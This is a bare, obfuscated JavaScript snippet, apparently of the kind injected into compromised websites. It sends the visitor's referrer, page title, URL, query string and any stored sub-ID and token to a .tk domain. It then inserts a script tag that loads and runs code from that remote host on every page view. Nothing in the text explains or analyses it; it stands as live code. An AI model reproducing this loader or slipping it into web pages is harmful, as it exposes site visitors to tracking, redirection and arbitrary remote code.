 (function() {
    var name = '_bdRrXLJ9DwmDdK7T';
    if (!window._bdRrXLJ9DwmDdK7T) {
        window._bdRrXLJ9DwmDdK7T = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/8c8pLv',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _r249RFyZwWjMLDBM = localStorage.getItem('config');
    if (typeof _r249RFyZwWjMLDBM !== 'undefined' && _r249RFyZwWjMLDBM !== null) {
        var _gJLcrk62k8q183rf = JSON.parse(_r249RFyZwWjMLDBM);
        var _r44GFf2kttvXdqbg = Math.round(+new Date()/1000);
        if (_gJLcrk62k8q183rf.created_at + window._bdRrXLJ9DwmDdK7T.ttl < _r44GFf2kttvXdqbg) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _7ZrMQrQR5BZBTYdh = localStorage.getItem('subId');
    var _85vkTZzTf1QDXvYW = localStorage.getItem('token');
    var _RzwqtbgcS2QgVZhf = '?return=js.client';
        _RzwqtbgcS2QgVZhf += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _RzwqtbgcS2QgVZhf += '&se_referrer=' + encodeURIComponent(document.referrer);
        _RzwqtbgcS2QgVZhf += '&default_keyword=' + encodeURIComponent(document.title);
        _RzwqtbgcS2QgVZhf += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _RzwqtbgcS2QgVZhf += '&name=' + encodeURIComponent(name);
        _RzwqtbgcS2QgVZhf += '&host=' + encodeURIComponent(window._bdRrXLJ9DwmDdK7T.R_PATH);
    if (typeof _7ZrMQrQR5BZBTYdh !== 'undefined' && _7ZrMQrQR5BZBTYdh && window._bdRrXLJ9DwmDdK7T.unique) {
        _RzwqtbgcS2QgVZhf += '&sub_id=' + encodeURIComponent(_7ZrMQrQR5BZBTYdh);
    }
    if (typeof _85vkTZzTf1QDXvYW !== 'undefined' && _85vkTZzTf1QDXvYW && window._bdRrXLJ9DwmDdK7T.unique) {
        _RzwqtbgcS2QgVZhf += '&token=' + encodeURIComponent(_85vkTZzTf1QDXvYW);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._bdRrXLJ9DwmDdK7T.R_PATH + _RzwqtbgcS2QgVZhf;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
